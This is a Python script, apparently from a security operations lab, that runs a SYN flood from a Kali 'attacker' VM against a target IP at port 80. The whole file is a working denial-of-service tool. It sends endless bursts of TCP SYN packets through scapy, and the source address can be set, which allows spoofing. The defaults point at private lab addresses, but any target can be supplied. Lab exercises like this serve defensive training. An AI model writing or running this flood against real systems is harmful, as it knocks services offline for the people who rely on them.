#!/usr/bin/env python3
"""
=============================================================================
  malicious_flood.py  —  SYN Flood Attack Script
  VM1: Kali Linux Attacker
  Run: sudo python3 attacker/malicious_flood.py
=============================================================================
"""

import os, sys, time, random, argparse

if os.geteuid() != 0:
    print("[ERROR] Run as root: sudo python3 attacker/malicious_flood.py")
    sys.exit(1)

try:
    from scapy.all import IP, TCP, send, RandShort
except ImportError:
    os.system("pip3 install scapy --break-system-packages")
    from scapy.all import IP, TCP, send, RandShort

# ── CLI args ──────────────────────────────────────────────────────────────────
parser = argparse.ArgumentParser(description="SYN Flood — SOC Lab Attacker")
parser.add_argument("--target",  default="192.168.100.20", help="Target IP")
parser.add_argument("--src",     default="192.168.100.10", help="Source IP")
parser.add_argument("--port",    type=int, default=80,     help="Target port")
parser.add_argument("--burst",   type=int, default=50,     help="SYNs per burst")
parser.add_argument("--delay",   type=float, default=0.05, help="Delay between bursts (s)")
parser.add_argument("--count",   type=int, default=0,      help="Total SYNs to send (0 = infinite)")
args = parser.parse_args()

print("=" * 55)
print("  SYN FLOOD — ATTACKER")
print(f"  Target : {args.target}:{args.port}")
print(f"  Source : {args.src}")
print(f"  Burst  : {args.burst} SYNs every {args.delay}s")
print(f"  Count  : {'infinite' if args.count == 0 else args.count}")
print("=" * 55)
print("\n[ATTACK] Starting flood... Ctrl+C to stop\n")

total = 0
try:
    while True:
        pkts = [
            IP(src=args.src, dst=args.target) /
            TCP(
                sport=RandShort(),
                dport=args.port,
                flags="S",
                seq=random.randint(1000, 900000),
                window=1024
            )
            for _ in range(args.burst)
        ]
        send(pkts, verbose=False)
        total += args.burst
        print(f"\r  Sent: {total:>6} SYN packets", end="", flush=True)

        if args.count > 0 and total >= args.count:
            break
        time.sleep(args.delay)

except KeyboardInterrupt:
    pass

print(f"\n\n[DONE] Total SYN packets sent: {total}")
